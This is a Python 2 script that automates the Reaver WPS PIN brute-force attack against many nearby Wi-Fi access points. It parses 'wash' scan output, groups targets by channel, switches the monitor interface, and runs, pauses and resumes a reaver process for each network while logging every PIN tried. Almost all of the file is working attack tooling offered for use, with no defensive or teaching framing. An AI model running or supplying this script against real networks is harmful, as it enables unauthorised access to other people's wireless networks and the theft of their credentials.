#/usr/local/bin/python
import subprocess
import os
from select import select
import sys
import fcntl, os
import time
import re

INTERFACE  = "mon0"
REAVER_CMD = "/root/reaver/src/reaver -i %s -b %%s -c %%d -vv -s blah" % (INTERFACE)
WASH_CMD   = "/root/reaver/src/wash -i %s -c 6" % (INTERFACE)

WASH_TIMEOUT = 20

LOG_DIR = "reaver-script-logs"

VERBOSE = 2
INFO = 1
ERROR = 0

LEVEL = 100
DISABLED = LEVEL + 1
SIGCONT = 18

PAUSE_STRING = "Reaver-script: Sleep"

CHAN_MIN = 1
CHAN_MAX = 11

START_TIME_STR = time.asctime()
LOG_RUN_DIR = os.path.join(LOG_DIR, START_TIME_STR) 
TOTAL_NUMBER_OF_PINS = 0

def prepare_log_dir():
    os.makedirs(LOG_RUN_DIR)

def debug(level, *args):
    if level<=LEVEL:
        buffer = "".join([str(i) for i in args])
        print buffer

class Group(object):
    def __init__(self, channel, networks=None):
        if networks==None:
            networks = []
        self.channel = channel
        self.networks = networks
        self.last_iter_time = 0
        self.iter_count = 0
        self.avg_iter_time = 0
        self.total_run_time = 0
        
    def add(self,n):
        self.networks.append(n)
    
    def count(self):
        return len(self.networks)
    
    def __repr__(self):
        buffer = "Group: \n"
        buffer += "\tchannel : %d\n" % self.channel
        buffer += "\titer_count : %d\t" % self.iter_count
        buffer += "avg_iter_time : %d\n" % self.avg_iter_time
        for i in xrange(len(self.networks)):
            n = self.networks[i]
            if n.dead:
                sleeping = "dead"
            elif n.running:
                sleeping = "running"
            else:
                sleeping = "suspended"
            buffer += "\t%d) %s\t%s\t%d\t%s\t%d\t%s\n" % (i,
                                                     sleeping,
                                                     n.current_pin,
                                                     n.pin_count,
                                                     n.bssid,
                                                     n.last_iter_duration,
                                                     n.essid)
        return buffer
    
    def run_loop(self):
        switch_channel(self.channel)
        self.run()
        self.select_loop()
    
    def select_loop(self):
        self.last_iter_time = 0
        self.iter_count +=1
        reverse_dict = {}

        r_wait_list = []
        for n in self.networks:
            if n.p!=None and n.p.poll()!=None:
                n.running = False
            if n.running == True:
                r_wait_list.append(n.p.stdout)
                r_wait_list.append(n.p.stderr)
                reverse_dict[n.p.stdout] = n
                reverse_dict[n.p.stderr] = n             
        
        start_time = time.time()
        while len(r_wait_list):
            r_wait_list = []
            for n in self.networks:
                if n.p!=None and n.p.poll()!=None:
                    n.running = False
                if n.running == True:
                    r_wait_list.append(n.p.stdout)
                    r_wait_list.append(n.p.stderr)        
            r_ready, w_ready, x_ready = select(r_wait_list, [], [], 0.5)
            if len(r_ready)==0:
                debug(DISABLED,"select_loop: len(r_ready)==0") 
            for f in r_ready:
                buffer = f.read()
                n = reverse_dict[f]
                for line in buffer.splitlines():
                    debug(VERBOSE, "%s: %s" % (n, line) )
                    n.write_to_log(line + "\n")
                    # Check for PAUSE_STRING
                    if line.find(PAUSE_STRING)!=-1:
                        debug(VERBOSE, "detected pause on %s" % n)
                        r_wait_list.remove(n.p.stdout)
                        r_wait_list.remove(n.p.stderr)
                        n.running = False
                        n.last_iter_duration = time.time() - start_time
                        n.suspend_time = time.time()
                        n.total_run_time += n.last_iter_duration
                        n.min_sleep_time = int(line.split(" ")[-1])
                        
                    if line.find("Trying pin")!=-1:
                        new_pin = line.split(" ")[-1]
                        if new_pin != n.current_pin:
                            n.current_pin = new_pin
                            n.pin_count += 1
                            global TOTAL_NUMBER_OF_PINS
                            TOTAL_NUMBER_OF_PINS += 1
        
        self.last_iter_time = time.time() - start_time     
        self.total_run_time += self.last_iter_time
        self.avg_iter_time = self.total_run_time / self.iter_count
        
        debug(VERBOSE, "channel %d suspended" % self.channel)
        
    
    def run(self):
        for n in self.networks:
            if time.time() - n.suspend_time < n.min_sleep_time:
                debug(VERBOSE, "time.time() - n.suspend_time < n.min_sleep_time")
                continue
            if n.p == None:
                debug(INFO, "Starting reaver on network %s" % n)
                n.p = my_popen(n.get_command())
                n.running = True
                n.iter_count += 1
            elif n.p.poll()==None:
                n.p.send_signal(SIGCONT)
                n.running = True
                n.iter_count += 1
            else:
                n.dead = True
                n.running = False

class Network(object):
    def __init__(self,line):
        debug(VERBOSE, "wash: %s" % line)
        m = re.search(r'((?:(?:[A-F0-9]{2}):){5}[A-F0-9]{2}).+?([0-9]).+?(-*[0-9]+).+?([0-9]\.[0-9]).+?((?:Yes)|(?:No)).+?(\w+)', line)
        self.bssid, self.channel, self.rssi, self.version, self.locked, self.essid =  m.groups()
        self.channel = int(self.channel)
        self.rssi = int(self.rssi)
        self.running = False
        self.current_pin = "?"*8
        self.last_iter_duration = -1
        self.suspend_time = -1
        self.min_sleep_time = 0
        self.total_run_time = 0
        self.iter_count = 0
        if self.locked == "Yes":
            self.locked = True
        else:
            self.locked = False
        self.version = float(self.version)
        self.pin_count = 0
        self.p = None
        self.dead = False
        
    def __str__(self):
        return "%s(%d)" % (self.essid, self.channel)

    def get_command(self):
        return REAVER_CMD % (self.bssid, self.channel)
        
    def __del__(self):
        if self.p != None and self.p.poll() == None:
            debug(VERBOSE, "cleaning %s" % self)
            self.p.kill()
    
    def write_to_log(self, line):
        f = self.get_log_file()
        f.write(line)
        f.close()
    
    def get_log_file(self):
        filename = "%d - %s - %s" % (self.channel, self.bssid, self.essid)
        file_path = os.path.join(LOG_RUN_DIR, filename)
        return file(file_path,'a')
   
def my_popen(command):
    p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE, bufsize=1)
    fcntl.fcntl(p.stdout.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
    fcntl.fcntl(p.stderr.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
    return p

def switch_channel(n):
    debug(VERBOSE, "switching to channel %d." % n)
    subprocess.check_call("iwconfig %s channel %d" % (INTERFACE, n), shell=True)

def parse_wash(buffer):
    lines = buffer.splitlines()
    first_line = -1
    for i in xrange(len(lines)):
        if lines[i].find("BSSID")!=-1:
            first_line = i+2
            break

    networks = [Network(i) for i in lines[first_line:]]
    groups = [Group(i) for i in xrange(CHAN_MIN,CHAN_MAX+1)]
    for n in networks:
        print "adding %s to group %d" % (n, n.channel-1)
        groups[n.channel-1].add(n)
    return groups
    
def wash():
    print "Starting wash"
    start_time = time.time()
    p = my_popen(WASH_CMD)
    data = ""
    while (time.time() - start_time < WASH_TIMEOUT) and p.poll()==None:
        r_list, w_list, x_list = select([p.stdout, p.stderr], [], [], 0.5)
        for i in r_list:
            buffer = i.read()
            data += buffer
            if len(buffer)>0:
                print "A(%d): %s" % (len(buffer),buffer),
    
    if p.poll()!=None:
        raise Exception("wash finished ahead of time")
    p.terminate()
    #todo check return codeash 
    return data

def main():
    start_time = time.time()
    buffer = file(r'wash_test.txt','rb').read() 
    #buffer = wash()
    prepare_log_dir()
    groups = parse_wash(buffer)
        
    for i in groups:
        print repr(i)
    while True:
        for g in groups:
            total_time = time.time() - start_time
            debug(INFO, "STATS: tested %d pins, %0.1f sec/pin" % (TOTAL_NUMBER_OF_PINS, total_time/float(TOTAL_NUMBER_OF_PINS)) )
            if g.count()==0:
                continue
            g.run_loop()
            print repr(g)
    
main()
